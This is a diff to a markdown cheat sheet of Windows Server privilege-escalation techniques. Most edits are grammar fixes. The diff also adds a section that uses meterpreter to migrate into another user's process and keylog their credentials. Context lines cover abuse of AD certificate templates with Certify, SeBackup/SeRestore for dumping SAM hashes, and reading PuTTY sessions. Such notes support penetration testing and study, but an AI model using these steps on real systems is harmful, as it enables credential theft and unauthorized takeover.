@@ -23,6 +23,7 @@ title: Windows Server privilege-escalation notes
   - [4.2. Shell history](#42-shell-history)
   - [4.3. Memory-saved credentials](#43-memory-saved-credentials)
   - [4.4. SSH software](#44-ssh-software)
+  - [4.5. Credentials keylogging](#45-credentials-keylogging)
 
 ## 1. Automatic tools
 
@@ -48,7 +49,7 @@ Most important values:
 Certify.exe find /vulnerable
 ```
 
-If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (an user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.
+If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (a user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.
 
 ```powershell
 # Request an certificate for Administrator
@@ -144,7 +145,7 @@ Every user has some privileges and some of them might be used to perform privile
 Check current privileges: `whoami /priv`
 
 #### 3.4.1. SeBackup and SeRestore
-The `SeBackup` and `SeRestore` allow an user to read and write to **any file in the system**, ignoring any DACL. They are used to perform full backup of the system without requiring full admin privileges. Using these privileges an attacker is able to export SAM database and extract users hashes offline. More in: `post-exploitation`.
+The `SeBackup` and `SeRestore` allow a user to read and write to **any file in the system**, ignoring any DACL. They are used to perform full backup of the system without requiring full admin privileges. Using these privileges an attacker is able to export SAM database and extract users hashes offline. More in: `post-exploitation`.
 
 #### 3.4.2. SeTakeOwnership
 The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system. An attacker can search for a service running as SYSTEM and take ownership of the service's executable.
@@ -221,4 +222,28 @@ PuTTY is probably the most common SSH client for Windows in use. It often stores
 ```powershell
 # Show PuTTY configuration
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+### 4.5. Credentials keylogging
+If we already have SYSTEM privileges in the OS we can set a keylogger on sessions of another user to steal their credentials.
+
+```powershell
+# Check for other users sessions
+ps | grep "explorer"
+```
+
+Use `meterpreter` session:
+
+```bash
+# Migrate to the another user's process
+> migrate <PID>
+
+# Check current context
+> getuid
+
+# Run keylogger
+> keyscan_start
+
+# Wait... and dump logs
+> keyscan_dump
 ```
